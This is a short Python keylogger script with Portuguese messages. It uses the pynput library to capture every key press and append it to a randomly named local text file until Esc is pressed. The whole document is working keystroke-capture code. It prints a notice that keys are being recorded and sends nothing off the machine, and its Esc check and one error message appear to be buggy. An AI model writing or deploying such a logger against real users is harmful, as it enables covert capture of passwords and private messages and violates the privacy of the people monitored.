from pynput.keyboard import Listener
import sys
import random

def encerrar_programa():
    print('programa foi encerrado"')
    sys.exit()

def escreve_key(key):
    try:
        with open(log, 'a') as file:
            file.write(f'{str(key)} \n')
    except Exception as e:
        print('Erro ao capturar a tecla {e} ')
        encerrar_programa()
    if key == key.esc:
        encerrar_programa()
log = f'yek{random.randint(0, 1000)}.txt'
print('as teclas estão sendo capturadas')
with Listener(on_press=escreve_key) as logs:
    try:
        logs.join()
    except Exception as e:
        print('Erro durante a execução do programa')
    finally:
        logs.stop()
        encerrar_programa()
